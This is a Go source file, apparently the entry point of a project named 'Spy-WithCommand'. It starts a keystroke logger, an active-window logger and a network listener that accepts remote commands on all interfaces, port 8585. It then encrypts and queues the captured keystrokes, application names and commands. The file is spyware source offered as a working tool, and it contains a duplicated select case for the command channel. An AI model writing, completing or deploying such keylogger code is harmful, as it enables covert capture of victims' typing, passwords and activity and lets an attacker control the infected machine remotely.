package main

import (
	"fmt"
	"github.com/mhthrh/Spy-WithCommand/Application"
	"github.com/mhthrh/Spy-WithCommand/Command"
	"github.com/mhthrh/Spy-WithCommand/KeyBoard"
	"github.com/mhthrh/Spy-WithCommand/Utils/CryptoUtil"
	"github.com/mhthrh/Spy-WithCommand/Utils/NetUtil"
	"time"
)

var (
	key, app, cmd                        = make(chan string), make(chan string), make(chan string)
	CommandQueue, WindowQueue, CharQueue = make(chan Command.Command, 100), make(chan Application.Application, 500), make(chan KeyBoard.KeyBoard, 10000)
	crypto                               CryptoUtil.Crypto
)

func init() {
	crypto = *CryptoUtil.NewKey()
}
func main() {

	go NetUtil.Listener("0.0.0.0", 8585, cmd)

	go KeyBoard.KeyLogger(key)
	go Application.AppLogger(app)

	for {
		select {
		case res := <-key:
			crypto.Text = res
			CharQueue <- KeyBoard.KeyBoard{
				Char:     crypto.Result,
				DateTime: time.Now(),
			}
			fmt.Println("added1")

		case res := <-app:
			crypto.Text = res
			WindowQueue <- Application.Application{
				App:      crypto.Result,
				DateTime: time.Now(),
			}
			fmt.Println("added2")

		case res := <-cmd:
			crypto.Text = res
			CommandQueue <- Command.Command{
				Cmd:      crypto.Result,
				DateTime: time.Now(),
			}
			fmt.Println("added3")
		case res := <-cmd:
			crypto.Text = res
			CommandQueue <- Command.Command{
				Cmd:      crypto.Result,
				DateTime: time.Now(),
			}
			fmt.Println("added3")
		case res1 := <-CommandQueue:

			fmt.Println("added4")
			fmt.Println(res1)
		}
	}
}
